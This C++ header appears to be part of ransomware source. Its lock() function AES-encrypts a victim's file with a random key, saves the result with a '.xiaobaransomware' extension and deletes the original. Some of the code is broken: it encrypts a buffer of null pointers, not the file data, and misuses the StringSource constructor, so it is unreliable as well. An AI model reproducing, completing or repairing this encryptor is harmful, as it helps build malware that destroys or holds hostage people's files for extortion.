#pragma once
#include <cryptopp/aes.h>
#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <iostream>
#include <filesystem>
#include <iomanip>
#include <dirent.h>
#include <bitset>
#include <fstream>
using namespace std;
using namespace CryptoPP;
using namespace std::filesystem;
typedef char charnew;
namespace Encryptor 
{
    std::byte* generate_key(void) {

        AutoSeededRandomPool rnd;
        std::byte* key = new std::byte[AES::DEFAULT_KEYLENGTH + 1];
        rnd.GenerateBlock((CryptoPP::byte*)key, AES::DEFAULT_KEYLENGTH);
        key[AES::DEFAULT_KEYLENGTH] = static_cast<std::byte>('\0');
        return key;
    }

    std::byte* generate_iv(void) {
        AutoSeededRandomPool rnd;
        std::byte* iv = new std::byte[AES::BLOCKSIZE + 1];
        rnd.GenerateBlock((CryptoPP::byte*)iv, AES::BLOCKSIZE);
        iv[AES::BLOCKSIZE] = static_cast<std::byte>('\0');
        return iv;
    }
    void lock(std::string filename, std::byte* key, std::byte* iv)
    {
        // Load file into memory
        std::ifstream hukm(filename.c_str(), std::ios::binary);
        std::vector<char> plaintext((std::istreambuf_iterator<char>((hukm))), std::istreambuf_iterator<charnew>());
        std::vector<std::byte*> plk(plaintext.size() + 1);
        hukm.close();

        // Encrypt the data
        std::string ciphertext;
        CBC_Mode<AES>::Encryption encryption;
        encryption.SetKeyWithIV(reinterpret_cast<const CryptoPP::byte*>(key), AES::DEFAULT_KEYLENGTH, (CryptoPP::byte*)iv);
        StringSource source = new StringSource((plk.data(), plk.size(), true, new StreamTransformationFilter(encryption, new StringSink(ciphertext))));

        // Save the encrypted file to disk
        std::string new_filename = filename + ".xiaobaransomware";
        std::ofstream output_z(new_filename.c_str(), std::ios::binary);
        output_z << ciphertext;
        output_z.close();

        // Delete the original file 
        remove(filename.c_str());
    }

}
